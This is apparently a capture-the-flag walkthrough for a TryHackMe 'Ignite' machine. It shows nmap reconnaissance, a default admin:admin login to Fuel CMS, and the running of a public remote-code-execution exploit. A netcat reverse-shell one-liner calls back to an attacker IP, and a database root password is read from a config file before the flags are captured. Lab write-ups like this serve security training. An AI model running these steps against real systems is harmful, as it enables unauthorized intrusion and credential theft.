## Ignite
1. Nmap Scan: ```nmap -sV -sC MACHINE_IP```
   
```
┌──(kali㉿kali)-[~/THM]
└─$ nmap -sV -sC 10.113.156.37    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-26 01:01 EDT
Nmap scan report for 10.113.156.37
Host is up (0.30s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-title: Welcome to FUEL CMS
```

2. I tried to go to ```http://IP/fuel``` and it redirect to ```http://10.114.156.45/fuel/login/``` and login using admin:admin 

3. Then i search for vulnerability:
   
   ```
    ┌──(kali㉿kali)-[~/THM]
    └─$ searchsploit fuel cms 1.4
    ------------------------------------------------------------- ---------------------------------
    Exploit Title                                               |  Path
    ------------------------------------------------------------- ---------------------------------
    fuel CMS 1.4.1 - Remote Code Execution (1)                   | linux/webapps/47138.py
    Fuel CMS 1.4.1 - Remote Code Execution (2)                   | php/webapps/49487.rb
    Fuel CMS 1.4.1 - Remote Code Execution (3)                   | php/webapps/50477.py
    Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)  | php/webapps/50523.txt
    Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)         | php/webapps/48741.txt
    Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authentica | php/webapps/48778.txt
    ------------------------------------------------------------- ---------------------------------
    Shellcodes: No Results
   ```

   Then I downloaded the py  
   ```
        ┌──(kali㉿kali)-[~/THM/ignite]
        └─$ searchsploit -m 50477    
        Exploit: Fuel CMS 1.4.1 - Remote Code Execution (3)
            URL: https://www.exploit-db.com/exploits/50477
            Path: /usr/share/exploitdb/exploits/php/webapps/50477.py
            Codes: CVE-2018-16763
        Verified: False
        File Type: Python script, ASCII text executable
        Copied to: /home/kali/THM/ignite/50477.py
   ```

   and change the url to http://MACHINE_IP

4. On the terminal: Run -- ``` python3 50477.py -u url``` and Listen from another terminal: ```nc -lvnp 4444```

    Use the following command to get the reverse shell: 
   
   ``` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTCKER_IP> 4444 >/tmp/f ```


   On another terminal:


    ```
    $ ls
    README.md
    assets
    composer.json
    contributing.md
    fuel
    index.php
    robots.txt
    $ cat robots.txt
    User-agent: *
    Disallow: /fuel/$ nano robots.txt
    Unable to create directory /var/www/.nano: Permission denied
    It is required for saving/loading search history or cursor positions.
    ```

    1. Find the Database Credentials and look for a file named ```database.php```, read it and look for the passsword.
        ```
            $ cd /var/www/html/fuel/application/config
            $ ls
            MY_config.php
            MY_fuel.php
            MY_fuel_layouts.php
            MY_fuel_modules.php
            asset.php
            autoload.php
            config.php
            constants.php
            custom_fields.php
            database.php
            doctypes.php
            editors.php
            environments.php
            foreign_chars.php
            google.php
            hooks.php
            index.html
            memcached.php
            migration.php
            mimes.php
            model.php
            profiler.php
            redirects.php
            routes.php
            smileys.php
            social.php
            states.php
            user_agents.php
            $ cat database.php
            <?php
            defined('BASEPATH') OR exit('No direct script access allowed');

            /*
            | -------------------------------------------------------------------
            | DATABASE CONNECTIVITY SETTINGS
            | -------------------------------------------------------------------
            | This file will contain the settings needed to access your database.
            |
            | For complete instructions please consult the 'Database Connection'
            | page of the User Guide.
            |
            | -------------------------------------------------------------------
            | EXPLANATION OF VARIABLES
            | -------------------------------------------------------------------
            |
            |       ['dsn']      The full DSN string describe a connection to the database.
            |       ['hostname'] The hostname of your database server.
            |       ['username'] The username used to connect to the database
            |       ['password'] The password used to connect to the database
            |       ['database'] The name of the database you want to connect to
            |       ['dbdriver'] The database driver. e.g.: mysqli.
            |                       Currently supported:
            |                                cubrid, ibase, mssql, mysql, mysqli, oci8,
            |                                odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
            |       ['dbprefix'] You can add an optional prefix, which will be added
            |                                to the table name when using the  Query Builder class
            |       ['pconnect'] TRUE/FALSE - Whether to use a persistent connection
            |       ['db_debug'] TRUE/FALSE - Whether database errors should be displayed.
            |       ['cache_on'] TRUE/FALSE - Enables/disables query caching
            |       ['cachedir'] The path to the folder where cache files should be stored
            |       ['char_set'] The character set used in communicating with the database
            |       ['dbcollat'] The character collation used in communicating with the database
            |                                NOTE: For MySQL and MySQLi databases, this setting is only used
            |                                as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7
            |                                (and in table creation queries made with DB Forge).
            |                                There is an incompatibility in PHP with mysql_real_escape_string() which
            |                                can make your site vulnerable to SQL injection if you are using a
            |                                multi-byte character set and are running versions lower than these.
            |                                Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
            |       ['swap_pre'] A default table prefix that should be swapped with the dbprefix
            |       ['encrypt']  Whether or not to use an encrypted connection.
            |
            |                       'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
            |                       'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
            |
            |                               'ssl_key'    - Path to the private key file
            |                               'ssl_cert'   - Path to the public key certificate file
            |                               'ssl_ca'     - Path to the certificate authority file
            |                               'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format
            |                               'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')
            |                               'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
            |
            |       ['compress'] Whether or not to use client compression (MySQL only)
            |       ['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
            |                                                       - good for ensuring strict SQL while developing
            |       ['ssl_options'] Used to set various SSL options that can be used when making SSL connections.
            |       ['failover'] array - A array with 0 or more data for connections if the main should fail.
            |       ['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
            |                               NOTE: Disabling this will also effectively disable both
            |                               $this->db->last_query() and profiling of DB queries.
            |                               When you run a query, with this setting set to TRUE (default),
            |                               CodeIgniter will store the SQL statement for debugging purposes.
            |                               However, this may cause high memory usage, especially if you run
            |                               a lot of SQL queries ... disable this to avoid that problem.
            |
            | The $active_group variable lets you choose which connection group to
            | make active.  By default there is only one group (the 'default' group).
            |
            | The $query_builder variables lets you determine whether or not to load
            | the query builder class.
            */
            $active_group = 'default';
            $query_builder = TRUE;

            $db['default'] = array(
                    'dsn'   => '',
                    'hostname' => 'localhost',
                    'username' => 'root',
                    'password' => 'mememe',
                    'database' => 'fuel_schema',
                    'dbdriver' => 'mysqli',
                    'dbprefix' => '',
                    'pconnect' => FALSE,
                    'db_debug' => (ENVIRONMENT !== 'production'),
                    'cache_on' => FALSE,
                    'cachedir' => '',
                    'char_set' => 'utf8',
                    'dbcollat' => 'utf8_general_ci',
                    'swap_pre' => '',
                    'encrypt' => FALSE,
                    'compress' => FALSE,
                    'stricton' => FALSE,
                    'failover' => array(),
                    'save_queries' => TRUE
            );

            // used for testing purposes
            if (defined('TESTING'))
            {
                    @include(TESTER_PATH.'config/tester_database'.EXT);
            }
            $ su root
            su: must be run from a terminal
        ```
    2. Got an tty error ```su: must be run from a terminal```
        Run this: ```python3 -c 'import pty; pty.spawn("/bin/bash")'```

    3. Read the txt files:
        ```
            root@ubuntu:/# ls -la home/www-data
            ls -la home/www-data
            total 12
            drwx--x--x 2 www-data www-data 4096 Jul 26  2019 .
            drwxr-xr-x 3 root     root     4096 Jul 26  2019 ..
            -rw-r--r-- 1 root     root       34 Jul 26  2019 flag.txt
            root@ubuntu:/# cat home/www-data/flag.txt
            cat home/www-data/flag.txt
            <<Flag>> 
            root@ubuntu:/# cat /root/root.txt
            cat /root/root.txt
            <<Flag>>
        ```